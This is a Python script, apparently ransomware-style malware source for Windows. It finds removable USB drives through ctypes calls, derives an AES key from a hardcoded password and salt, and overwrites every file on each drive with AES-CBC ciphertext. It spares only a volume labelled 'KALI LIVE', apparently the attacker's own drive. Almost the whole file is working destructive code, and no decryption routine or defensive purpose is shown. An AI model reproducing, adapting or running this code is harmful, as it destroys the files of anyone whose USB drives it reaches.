import os
import ctypes
import string
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

PASSWORD = b"supermotdepassedefousupersecurisejesuistropcontent"
SALT = b"seldemaladepouruneaessupersecu"

def derive_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100_000,
        backend=default_backend()
    )
    return kdf.derive(password)

def pad(data):
    padding_len = 16 - len(data) % 16
    return data + bytes([padding_len]) * padding_len

def encrypt_file(filepath, key):
    try:
        with open(filepath, "rb") as f:
            plaintext = f.read()
        iv = secrets.token_bytes(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded = pad(plaintext)
        ciphertext = encryptor.update(padded) + encryptor.finalize()
        with open(filepath, "wb") as f:
            f.write(iv + ciphertext)
        print(f"[ENCRYPTED] {filepath}")
    except Exception as e:
        print(f"[ERROR] {filepath}: {e}")

def encrypt_all_files(root_dir, key):
    for foldername, subfolders, filenames in os.walk(root_dir):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            encrypt_file(file_path, key)

def get_removable_drives():
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for i in range(26):
        if bitmask & (1 << i):
            drive_letter = f"{string.ascii_uppercase[i]}:\\"
            drive_type = ctypes.windll.kernel32.GetDriveTypeW(ctypes.c_wchar_p(drive_letter))
            # DRIVE_REMOVABLE = 2
            if drive_type == 2:
                drives.append(drive_letter)
    return drives

def get_volume_label(drive_letter):
    volume_name_buf = ctypes.create_unicode_buffer(1024)
    fs_name_buf = ctypes.create_unicode_buffer(1024)
    serial_number = max_component_len = file_system_flags = ctypes.c_ulong()
    ctypes.windll.kernel32.GetVolumeInformationW(
        ctypes.c_wchar_p(drive_letter),
        volume_name_buf,
        ctypes.sizeof(volume_name_buf),
        ctypes.byref(serial_number),
        ctypes.byref(max_component_len),
        ctypes.byref(file_system_flags),
        fs_name_buf,
        ctypes.sizeof(fs_name_buf)
    )
    return volume_name_buf.value


if __name__ == "__main__":
    usb_drives = get_removable_drives()
    usb_drives.append('')
    if not usb_drives:
        print("⚠️ Aucune clé USB détectée.")
    else:
        key = derive_key(PASSWORD, SALT)
        for drive in usb_drives:
            volume_name = get_volume_label(drive)
            if volume_name == "KALI LIVE":
                print(f"🛑 Clé USB ignorée (volume : {volume_name}) : {drive}")
                continue
            print(f"🔍 Clé USB détectée : {drive} (volume : {volume_name})")
            encrypt_all_files(drive, key)